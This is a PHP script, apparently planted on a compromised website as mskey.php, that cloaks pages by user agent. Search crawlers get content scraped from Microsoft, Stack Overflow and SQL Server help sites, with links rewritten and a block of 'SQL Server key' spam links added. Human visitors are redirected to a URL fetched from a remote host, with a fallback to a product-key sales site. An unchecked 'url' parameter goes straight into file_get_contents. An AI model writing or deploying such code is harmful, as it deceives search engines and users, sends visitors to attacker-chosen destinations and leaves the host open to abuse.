<?php
$tmp = strtolower($_SERVER['HTTP_USER_AGENT']);

if (strpos($tmp, 'google') !== false || strpos($tmp, 'yahoo') !== false || strpos($tmp, 'aol') !== false || strpos($tmp, 'sqworm') !== false || strpos($tmp, 'bot') !== false) {
	$filename = "mskey.php";
	$ksite = !empty($_GET['new']) ? $_GET['new'] : "";

	$list = array(
		"SQL-Server-2012-Enterprise-Key"=>"http://blogs.technet.com/b/sqlsmalltalk/archive/2012/05/12/remove-evaluation-edition-180-day-time-bomb-from-sql-server.aspx",
		"SQL-Server-2012-Enterprise-Key-online"=>"http://www.mssqlgirl.com/upgrading-from-sql-server-2012-evaluation-edition.html",
		"sql-server-product-key-2"=>"http://www.sqlcoffee.com/SQLServer2012_0015.htm",
		"sql-server-product-key"=>"http://sqlserver-help.com/tag/msdn-sql-server-product-key/",
        "sql-server-trial-edition-key"=>"http://serverfault.com/questions/225197/sql-server-trial-edition-to-full-edition",
        "sql-server-2012-evaluation-key"=>"http://stackoverflow.com/questions/18934981/unable-to-upgrade-from-sql-server-2012-evaluation-to-standard",
		"SQL-Server-2012-Enterprise-Key-2"=>"http://www.mssqlgirl.com/upgrading-from-sql-server-2012-evaluation-edition.html",
        "Ms-SQL-Server-2012-Serial-Key"=>"https://www.scribd.com/doc/207492533/Ms-SQL-Server-2012-Serial-Number"
	);

	$fromsite = "http://windows.microsoft.com/en-us/windows/get-windows-product-key#get-windows-product-key=windows-7";

	$listname = $filename . "?new=";
	$liststr = "<div style='text-align: center'>";
	foreach ($list as $key => $val) {
		if ($ksite == $key) {
			$fromsite = $val;
		}
		$liststr .= "<a href='" . $filename . "?new=" . $key . "'>" . $key . "</a>&nbsp;&nbsp;";
	}
	$liststr .= "</div>";
	$url = empty($_GET['url']) ? "" : $_GET['url'];
	$content = file_get_contents($fromsite . $url);
	$mysite = "http://www.hitsvet.by/";
	if (!empty($ksite)) {
		$qstr = $filename . "?new=" . $ksite . "&url=";

	} else {

		$qstr = $filename . "?url=";
	}
	$repstr = $mysite . $qstr;

	$content = str_ireplace('href="', 'href="/', $content);
	$content = str_ireplace('href="//', 'href="/', $content);
	$content = str_ireplace('href="/http', 'href="http', $content);
	$content = str_ireplace('href="/http', 'href="http', $content);
	$content = str_replace('href="/', 'href="' . $fromsite, $content);

	$content = str_ireplace('src="', 'src="/', $content);
	$content = str_ireplace('src="//', 'src="/', $content);
	$content = str_ireplace('src="/http', 'src="http', $content);
	$content = str_ireplace('src="/http', 'src="http', $content);
	$content = str_replace('src="/', 'src="' . $fromsite, $content);

	$content = str_ireplace($fromsite, $repstr, $content);

	$content = str_replace($repstr . "skin", $fromsite . "skin", $content);
	$content = str_replace($repstr . "style", $fromsite . "style", $content);
	$content = str_replace($repstr . "js", $fromsite . "js", $content);
	$content = str_replace($repstr . "media", $fromsite . "media", $content);
	$content = str_replace($repstr . "res", $fromsite . "res", $content);

	$content = str_replace("</body>", $liststr . "</body>", $content);
	echo $content;
} else {
	$tiaourl = trim(file_get_contents("http://js.jrocam.com/kish2.txt"));
	if(!empty($tiaourl)){
		header("location: " . $tiaourl);
	}else{
        header('Location: http://www.buyofficialkey.com');
	}
}
?>
